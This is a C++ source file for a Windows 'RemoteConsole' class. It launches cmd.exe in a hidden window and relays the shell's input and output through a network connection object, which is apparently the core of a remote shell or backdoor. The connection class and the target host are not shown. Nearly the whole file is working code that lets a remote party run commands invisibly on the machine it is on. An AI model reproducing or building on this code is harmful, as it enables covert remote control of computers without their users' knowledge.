#include <windows.h>
#include <string>
#include <iostream>
using namespace std;

#define BUFFSIZE 8096

class RemoteConsole{
private:

	//init - for making process
	STARTUPINFO startInfo;
	SECURITY_ATTRIBUTES securityAttr;
	PROCESS_INFORMATION procInfo;

	//pointer to object passed in constructor
	Connection * con;

	//handles for pipes
	HANDLE newstdin, newstdout, read_stdout, write_stdin;
	
public:
	RemoteConsole(Connection * con){

		this->con = con;
		securityAttr.lpSecurityDescriptor = NULL;
		securityAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
		securityAttr.bInheritHandle = true;

		//pipes
		CreatePipe(&newstdin, &write_stdin, &securityAttr, 0);
		CreatePipe(&read_stdout, &newstdout, &securityAttr, 0);

		//child process (console) init
		GetStartupInfo(&startInfo);
		startInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		startInfo.wShowWindow = SW_HIDE;
	
		//handles go here (out and error together)
		startInfo.hStdOutput = newstdout;
		startInfo.hStdError = newstdout;
		startInfo.hStdInput = newstdin;
		
		//location (could do this for another app sometime)
		TCHAR * app_spawn = TEXT("C:\\Windows\\System32\\cmd.exe");

		//spawn the child process
		CreateProcess(app_spawn, NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startInfo, &procInfo);
	}
	
	int start(){

		//try to get connection
		if (con->start() != 1) {
			LOG("Connection start failed", -1);
			return 0;
		};

		DWORD exit = 0;   //for process exit
		DWORD readSize = 0;   //bytes

		//for CMD's output
		char outBuffer[BUFFSIZE];

		//put \0 everywere for string to stop
		memset(outBuffer, 0, sizeof(outBuffer));

		//wait for first text to appear
		do{
			PeekNamedPipe(read_stdout, outBuffer, BUFFSIZE - 1, &readSize, NULL, NULL);
		} while (readSize == 0);

		bool outSend = false;
		int msgDiff = 0;
		int result;
	
		char * bufSuffix = "\r\n";
		//main program loop
		for (;;)
		{
			//if you exit CMD ( ex. type 'exit' ) program stops
			GetExitCodeProcess(procInfo.hProcess, &exit);
			if (exit != STILL_ACTIVE) {
				LOG("|Closed by client", -2);
				return 1;
			}

			//look inside the pipe, is there anything?
			PeekNamedPipe(read_stdout, outBuffer, BUFFSIZE - 1, &readSize, NULL, NULL);

			//no output waiting
			if (readSize != 0){
				memset(outBuffer, 0, sizeof(outBuffer));

				//get output to buffer
				ReadFile(read_stdout, outBuffer, BUFFSIZE - 1, &readSize, NULL);
				//print to real console

				// PUT HERE SOCKET SENDING ==

					con->sendMessage(outBuffer, readSize);
					
				// ==========================
				
				//outSend tells if there was ANY response from CMD (must be something)
				outSend = false;
				msgDiff++;

				//every CMD output ends with >, so it's only way to finish task
				if (outBuffer[readSize - 1] != '>'){
					Sleep(500);
					continue;
				}
					
			}
			//still no response -> wait and check again
			if (outSend){
				Sleep(100);
				continue;
			}

			//take input from user
			char inBuffer[BUFFSIZE];
			memset(inBuffer, 0, sizeof(inBuffer));
			//take whole command 
			
			// SYNCHRONOUS SOCKET WAITING HERE

				result = con->getMessage(inBuffer, sizeof(inBuffer));	
		
			// ===============================

			if (result != 1) {
				return 2;
			}
			msgDiff--;

			//print what you've got
			LOG(inBuffer, -3);

			//if its CTRL+D -> exit
			if (inBuffer[0] == '\x4'){
				LOG("|Closed by client", -2);
				return 3;
			}

			if (msgDiff != 0){
				continue;
			}

			//  'cd\0'  -->  'cd'  cos we dont want \0 in WriteFile()
			WriteFile(write_stdin, inBuffer, strlen(inBuffer), &readSize, NULL);

			//append \r\n   so it looks like a real command
			WriteFile(write_stdin, bufSuffix, 2, &readSize, NULL);
			outSend = true;
			Sleep(500);
		}
	}

	~RemoteConsole(){
		//clean stuff up
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
		CloseHandle(newstdin);
		CloseHandle(newstdout);
		CloseHandle(read_stdout);
		CloseHandle(write_stdin);
	}
};